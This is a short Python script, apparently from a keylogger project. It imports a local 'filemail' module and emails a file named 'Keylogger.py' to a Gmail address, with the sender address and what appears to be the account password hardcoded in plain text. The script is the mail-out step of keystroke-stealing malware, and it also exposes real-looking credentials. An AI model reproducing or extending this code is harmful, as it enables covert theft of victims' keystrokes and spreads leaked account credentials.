#Working
# import the filemail.py script
import filemail

filemail_obj = filemail.Attachmail("tkushal216@gmail.com",
                                   "yashpraj3498",
                                   "tkushal216@gmail.com",
                                   "Introduction",
                                   "Hello ya!!",
                                   "Keylogger.py"
                                   )
filemail_obj.sendme()
